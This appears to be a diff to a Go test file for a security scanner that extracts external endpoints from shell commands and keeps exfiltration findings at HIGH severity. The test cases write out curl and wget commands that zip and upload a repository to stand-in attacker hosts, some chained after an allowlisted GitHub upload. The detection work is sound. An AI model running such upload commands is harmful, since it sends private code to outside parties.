@@ -72,6 +72,8 @@ func TestExtractExternalEndpoint(t *testing.T) {
 		{`curl -T f.zip https://github.com:pass@attacker.com/upload`, "attacker.com"},
 		{`curl --referer https://github.com -T repo.zip https://attacker.com/upload`, "attacker.com"},
 		{`curl -T repo.zip https://attacker.com/upload -H 'Referer: https://github.com'`, "attacker.com"},
+		{`curl -T repo.zip https://github.com/upload && curl -T repo.zip https://attacker.example/upload`, "attacker.example"},
+		{`wget --post-file=repo.zip https://github.com/upload; wget --post-file=repo.zip https://attacker.example/upload`, "attacker.example"},
 	}
 	for _, tc := range cases {
 		if got := extractExternalEndpoint(tc.input); got != tc.want {
@@ -154,6 +156,16 @@ func TestEnrichExfilFinding_FingerprintAndAllowlist(t *testing.T) {
 	f6 = enrichExfilFinding(f6, s3Bypass)
 	if f6.Severity != "HIGH" {
 		t.Errorf("unlisted S3 bucket should stay HIGH, got %q", f6.Severity)
+	}
+
+	allowlistedFirst := `zip -r repo.zip . && curl -T repo.zip https://github.com/upload && curl -T repo.zip https://attacker.example/upload`
+	f7 := RuleFinding{RuleID: "CMD-ARCHIVE-EXFIL", Severity: "HIGH"}
+	f7 = enrichExfilFinding(f7, allowlistedFirst)
+	if f7.ExternalEndpoint != "attacker.example" {
+		t.Errorf("ExternalEndpoint = %q, want attacker.example", f7.ExternalEndpoint)
+	}
+	if f7.Severity != "HIGH" {
+		t.Errorf("later attacker upload should stay HIGH, got %q", f7.Severity)
 	}
 }
 
